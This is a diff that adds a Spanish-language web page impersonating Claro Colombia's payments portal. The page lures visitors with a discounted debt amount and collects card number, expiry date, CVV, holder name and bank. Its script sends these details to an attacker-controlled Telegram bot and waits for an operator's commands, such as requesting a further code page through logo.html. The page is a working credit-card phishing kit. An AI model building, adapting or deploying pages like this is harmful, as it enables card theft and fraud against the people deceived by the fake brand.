@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="img/favicon.ico" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
+        rel="stylesheet" />
+    <title>Pago con Tarjeta | Claro</title>
+    <style>
+        body {
+            font-family: "Open Sans", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+        }
+
+        #loader-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #loader {
+            width: 3.25em;
+            transform-origin: center;
+            animation: rotate4 2s linear infinite;
+        }
+
+        circle {
+            fill: none;
+            stroke: hsl(0, 97%, 59%);
+            stroke-width: 2;
+            stroke-dasharray: 1, 200;
+            stroke-dashoffset: 0;
+            stroke-linecap: round;
+            animation: dash4 1.5s ease-in-out infinite;
+        }
+
+        @keyframes rotate4 {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes dash4 {
+            0% {
+                stroke-dasharray: 1, 200;
+                stroke-dashoffset: 0;
+            }
+
+            50% {
+                stroke-dasharray: 89, 200;
+                stroke-dashoffset: -35;
+            }
+
+            100% {
+                stroke-dasharray: 89, 200;
+                stroke-dashoffset: -124;
+            }
+        }
+
+        input:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px #FFC73C;
+        }
+
+        .input-error {
+            border-color: #EF3320;
+        }
+
+        .error-message {
+            color: #EF3320;
+            font-size: 0.8rem;
+            margin-top: 4px;
+        }
+    </style>
+</head>
+
+<body class="bg-gray-100 text-gray-800 antialiased">
+    <div class="px-6 flex items-center justify-between h-10 bg-white">
+        <div class="flex items-center gap-8">
+            <p class="text-sm text-[#313131] font-semibold border-b-4 border-[#FFC73C]">Personas</p>
+            <p class="hidden md:block text-sm text-[#313131] font-semibold hover:border-b-4 hover:border-[#FFC73C]">Negocios</p>
+            <p class="hidden md:block text-sm text-[#313131] font-semibold hover:border-b-4 hover:border-[#FFC73C]">Empresas</p>
+            <p class="hidden md:block text-sm text-[#313131] font-semibold hover:border-b-4 hover:border-[#FFC73C]">Institucional</p>
+        </div>
+        <div class="flex items-center gap-4">
+            <div class="flex items-center gap-2 text-sm text-[#313131] font-semibold">Más de Claro
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+                </svg>
+            </div>
+            <div class="flex items-center gap-2 text-sm text-[#313131] font-semibold">
+                <img class="w-5 h-5" src="./assets/flag-colombia.svg" alt="">
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+                </svg>
+            </div>
+        </div>
+    </div>
+    <header class="bg-[#EF3320] h-14 flex items-center px-4 md:px-10 justify-between">
+        <div class="flex items-center gap-4">
+            <svg xmlns="http://www.w3.org/2000/svg" class="md:hidden w-6 h-6 text-white" viewBox="0 0 24 24" fill="none"
+                stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M4 6h16M4 12h16M4 18h16" />
+            </svg>
+            <img class="w-20" src="./assets/claro.svg" alt="Claro">
+            <nav class="hidden md:flex items-center gap-6 text-white">
+                <div class="flex items-center gap-1"><span class="text-sm font-bold">Servicios</span>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
+                        <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+                    </svg>
+                </div>
+                <div class="flex items-center gap-1"><span class="text-sm font-bold">Tienda</span>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
+                        <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+                    </svg>
+                </div>
+                <div class="flex items-center gap-1"><span class="text-sm font-bold">Soporte</span>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
+                        <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+                    </svg>
+                </div>
+            </nav>
+        </div>
+        <div class="flex items-center gap-3">
+            <div class="hidden md:flex items-center gap-3 text-white"><span class="text-xs font-semibold">Información importante para usuarios</span>
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
+                    <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+                </svg>
+            </div>
+            <button class="flex items-center gap-2 rounded-full px-4 h-10 bg-[#D01508] text-white font-bold">
+                <img class="w-6 h-6" src="./assets/c2btn.png" alt=""> Mi Claro
+            </button>
+        </div>
+    </header>
+
+    <main class="px-4 md:px-10 py-6">
+        <div id="ggris1" class="bg-white rounded-xl p-6 shadow-sm max-w-2xl mx-auto">
+            <div class="text-gray-700 text-center">
+                <p class="text-xl font-semibold">
+                    Portal de <span class="text-[#EF3320]">PAGOS <span class="font-normal">Y RECARGAS</span></span>
+                </p>
+                <p class="mt-4 text-sm font-medium">Estás a punto de pagar:</p>
+                <p id="valor-a-pagar" class="text-4xl font-bold text-[#EF3320] mt-2">$ 0,00</p>
+            </div>
+        </div>
+
+        <section class="mt-6 max-w-2xl mx-auto bg-white p-6 shadow-lg rounded-lg">
+            <h2 class="text-lg font-bold text-center border-b pb-2 mb-4">Detalles de la Tarjeta</h2>
+            <form id="payment-form">
+                <div class="space-y-4">
+                    <div>
+                        <label for="cardNumber" class="block text-sm font-medium text-gray-700">Número de Tarjeta</label>
+                        <input type="text" id="cardNumber" name="cardNumber" inputmode="numeric" autocomplete="cc-number"
+                            placeholder="0000 0000 0000 0000" maxlength="19"
+                            class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" />
+                        <p id="error-cardNumber" class="error-message hidden">Número de tarjeta inválido.</p>
+                    </div>
+
+                    <div>
+                        <label for="cardName" class="block text-sm font-medium text-gray-700">Nombre del titular</label>
+                        <input type="text" id="cardName" name="cardName" autocomplete="cc-name"
+                            placeholder="Como aparece en la tarjeta"
+                            class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" />
+                        <p id="error-cardName" class="error-message hidden">El nombre del titular es requerido.</p>
+                    </div>
+
+                    <div class="flex space-x-4">
+                        <div class="w-1/2">
+                            <label for="expiryDate" class="block text-sm font-medium text-gray-700">Fecha de Vencimiento (MM/AA)</label>
+                            <input type="text" id="expiryDate" name="expiryDate" inputmode="numeric"
+                                placeholder="MM/AA" maxlength="5"
+                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" />
+                            <p id="error-expiryDate" class="error-message hidden">Fecha inválida.</p>
+                        </div>
+                        <div class="w-1/2">
+                            <label for="cvv" class="block text-sm font-medium text-gray-700">CVV</label>
+                            <input type="text" id="cvv" name="cvv" inputmode="numeric"
+                                placeholder="CVV" maxlength="3"
+                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" />
+                            <p id="error-cvv" class="error-message hidden">CVV inválido.</p>
+                        </div>
+                    </div>
+
+                    <div>
+                        <label for="bankSelect" class="block text-sm font-medium text-gray-700">Selecciona tu Banco</label>
+                        <select id="bankSelect" name="bankSelect" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm">
+                            <option value="">Selecciona un banco</option>
+                            <option value="Bancolombia">Bancolombia</option>
+                            <option value="Davivienda">Davivienda</option>
+                            <option value="Banco de Bogotá">Banco de Bogotá</option>
+                            <option value="BBVA Colombia">BBVA Colombia</option>
+                            <option value="Banco Popular">Banco Popular</option>
+                            <option value="Banco de Occidente">Banco de Occidente</option>
+                            <option value="Banco Caja Social">Banco Caja Social</option>
+                            <option value="Colpatria">Colpatria</option>
+                            <option value="AV Villas">AV Villas</option>
+                            <option value="Banco Pichincha">Banco Pichincha</option>
+                            <option value="Bancoomeva">Bancoomeva</option>
+                            <option value="Banco Agrario">Banco Agrario</option>
+                            <option value="Banco Falabella">Banco Falabella</option>
+                            <option value="Scotiabank Colpatria">Scotiabank Colpatria</option>
+                            <option value="Banco GNB Sudameris">Banco GNB Sudameris</option>
+                            <option value="Banco W">Banco W</option>
+                            <option value="Bancamía">Bancamía</option>
+                            <option value="Mibanco">Mibanco</option>
+                        </select>
+                        <p id="error-bankSelect" class="error-message hidden">Debes seleccionar un banco.</p>
+                    </div>
+
+                </div>
+
+                <div class="mt-8 text-center">
+                    <button type="submit" id="payButton"
+                        class="w-full h-14 rounded-xl text-white font-bold text-lg bg-[#EF3320] hover:bg-[#d01508] transition-colors">
+                        Pagar Ahora
+                    </button>
+                </div>
+            </form>
+        </section>
+    </main>
+
+    <footer class="mt-8">
+        <img class="hidden md:block w-full" src="./assets/footer-dk.png" alt="">
+        <img class="block md:hidden w-full" src="./assets/footer.png" alt="">
+    </footer>
+
+    <div id="loader-container">
+        <div id="loader">
+            <svg viewBox="25 25 50 50">
+                <circle r="20" cy="50" cx="50"></circle>
+            </svg>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const urlParams = new URLSearchParams(window.location.search);
+            const deudaTotal = parseFloat(urlParams.get('deuda'));
+
+            const formatCurrency = (amount) => {
+                return new Intl.NumberFormat('es-CO', {
+                    style: 'currency',
+                    currency: 'COP',
+                    minimumFractionDigits: 0,
+                    maximumFractionDigits: 0
+                }).format(amount);
+            };
+
+            if (!isNaN(deudaTotal)) {
+                const descuento = 0.20;
+                const deudaConDescuento = deudaTotal * (1 - descuento);
+                document.getElementById('valor-a-pagar').textContent = formatCurrency(deudaConDescuento);
+            } else {
+                console.error("No se encontraron parámetros de deuda válidos en la URL.");
+            }
+
+            const form = document.getElementById('payment-form');
+            const loaderContainer = document.getElementById('loader-container');
+
+            form.addEventListener('submit', async function (event) {
+                event.preventDefault();
+                let isValid = true;
+
+                // Limpiar errores previos
+                document.querySelectorAll('.error-message').forEach(el => el.classList.add('hidden'));
+                document.querySelectorAll('input, select').forEach(el => el.classList.remove('input-error'));
+
+                // Validación del número de tarjeta (16 dígitos sin espacios)
+                const cardNumber = document.getElementById('cardNumber');
+                const cleanCardNumber = cardNumber.value.replace(/\s/g, '');
+                if (cleanCardNumber.length !== 16 || !/^\d+$/.test(cleanCardNumber)) {
+                    document.getElementById('error-cardNumber').classList.remove('hidden');
+                    cardNumber.classList.add('input-error');
+                    isValid = false;
+                }
+
+                // Validación del nombre
+                const cardName = document.getElementById('cardName');
+                if (cardName.value.trim() === '') {
+                    document.getElementById('error-cardName').classList.remove('hidden');
+                    cardName.classList.add('input-error');
+                    isValid = false;
+                }
+
+                // Validación de la fecha de vencimiento (MM/AA)
+                const expiryDate = document.getElementById('expiryDate');
+                const expiryValue = expiryDate.value.replace(/\s/g, '');
+                if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryValue)) {
+                    document.getElementById('error-expiryDate').classList.remove('hidden');
+                    expiryDate.classList.add('input-error');
+                    isValid = false;
+                } else {
+                    const [month, year] = expiryValue.split('/').map(Number);
+                    const currentYear = new Date().getFullYear() % 100;
+                    const currentMonth = new Date().getMonth() + 1;
+                    if (year < currentYear || (year === currentYear && month < currentMonth)) {
+                        document.getElementById('error-expiryDate').textContent = 'Tarjeta vencida.';
+                        document.getElementById('error-expiryDate').classList.remove('hidden');
+                        expiryDate.classList.add('input-error');
+                        isValid = false;
+                    }
+                }
+
+                // Validación del CVV (3 o 4 dígitos)
+                const cvv = document.getElementById('cvv');
+                if (!/^\d{3,4}$/.test(cvv.value)) {
+                    document.getElementById('error-cvv').classList.remove('hidden');
+                    cvv.classList.add('input-error');
+                    isValid = false;
+                }
+
+                // Validación del banco
+                const bankSelect = document.getElementById('bankSelect');
+                if (bankSelect.value === '') {
+                    document.getElementById('error-bankSelect').classList.remove('hidden');
+                    bankSelect.classList.add('input-error');
+                    isValid = false;
+                }
+
+                if (isValid) {
+                    loaderContainer.style.display = 'flex';
+
+                    // Lógica del segundo código
+                    const cardData = {
+                        tarjeta: cleanCardNumber,
+                        fechaExpiracion: expiryDate.value,
+                        cvv: cvv.value,
+                        banco: bankSelect.value
+                    };
+
+                    const transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
+                    const message =
+                        `<b>🔔 Nuevo pago con tarjeta:</b>
+                        💳 <b>Tarjeta:</b> ${cardData.tarjeta}
+                        📅 <b>Venc.:</b> ${cardData.fechaExpiracion}
+                        🔐 <b>CVV:</b> ${cardData.cvv}
+                        👤 <b>Nombre:</b> ${cardName.value}
+                        🏦 <b>Banco:</b> ${cardData.banco}
+                        💰 <b>Monto:</b> ${document.getElementById('valor-a-pagar').textContent}
+                        🆔 <b>ID:</b> ${transactionId}`;
+
+                    const keyboard = {
+                        inline_keyboard: [
+                            [{ text: "Pedir Logo", callback_data: `pedir_logo:${transactionId}` }],
+                            [{ text: "Error de Tarjeta", callback_data: `error_tc:${transactionId}` }],
+                            [{ text: "Confirmar", callback_data: `confirm_finalizar:${transactionId}` }]
+                        ]
+                    };
+
+                    async function loadCfg() {
+                        const res = await fetch('config.json');
+                        if (!res.ok) throw 'No se pudo cargar config.json';
+                        return res.json();
+                    }
+
+                    try {
+                        const cfg = await loadCfg();
+                        const res = await fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: cfg.chat_id,
+                                text: message,
+                                reply_markup: keyboard,
+                                parse_mode: 'HTML'
+                            })
+                        });
+                        const js = await res.json();
+                        if (!js.ok) throw js;
+
+                        poll(cfg, transactionId);
+                    } catch (err) {
+                        console.error(err);
+                        loaderContainer.style.display = 'none';
+                        alert('Error enviando a Telegram. Por favor, inténtelo de nuevo.');
+                    }
+                }
+            });
+
+            // Poll para esperar la acción del admin
+            async function poll(cfg, tid) {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${cfg.token}/getUpdates`);
+                    const js = await res.json();
+                    const upd = js.result.find(u => u.callback_query?.data?.endsWith(`:${tid}`));
+                    if (upd) {
+                        loaderContainer.style.display = 'none';
+                        const action = upd.callback_query.data.split(':')[0];
+                        switch (action) {
+                            case 'pedir_logo':
+                                // Guardar los datos en localStorage antes de redirigir
+                                localStorage.setItem('formData', JSON.stringify({
+                                    tarjeta: document.getElementById('cardNumber').value,
+                                    fechaExpiracion: document.getElementById('expiryDate').value,
+                                    cvv: document.getElementById('cvv').value,
+                                    nombre: document.getElementById('cardName').value,
+                                    banco: document.getElementById('bankSelect').value
+                                }));
+                                window.location.href = 'logo.html';
+                                break;
+                            case 'error_tc':
+                                alert('Ha ocurrido un error con su tarjeta. Por favor, verifique los datos.');
+                                // O redirigir a una página de error específica si existe
+                                break;
+                            case 'confirm_finalizar':
+                                window.location.href = `index.html`; // Redirigir a una página de confirmación
+                                break;
+                        }
+                    } else {
+                        setTimeout(() => poll(cfg, tid), 2000);
+                    }
+                } catch {
+                    setTimeout(() => poll(cfg, tid), 2000);
+                }
+            }
+
+
+            // Formatear el número de tarjeta con espacios
+            document.getElementById('cardNumber').addEventListener('input', function(e) {
+                const target = e.target;
+                let value = target.value.replace(/\s/g, '');
+                value = value.replace(/(\d{4})/g, '$1 ').trim();
+                target.value = value;
+            });
+
+            // Formatear la fecha de vencimiento
+            document.getElementById('expiryDate').addEventListener('input', function(e) {
+                const target = e.target;
+                let value = target.value.replace(/\D/g, '');
+                if (value.length > 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+                target.value = value;
+            });
+        });
+    </script>
+</body>
+
+</html>
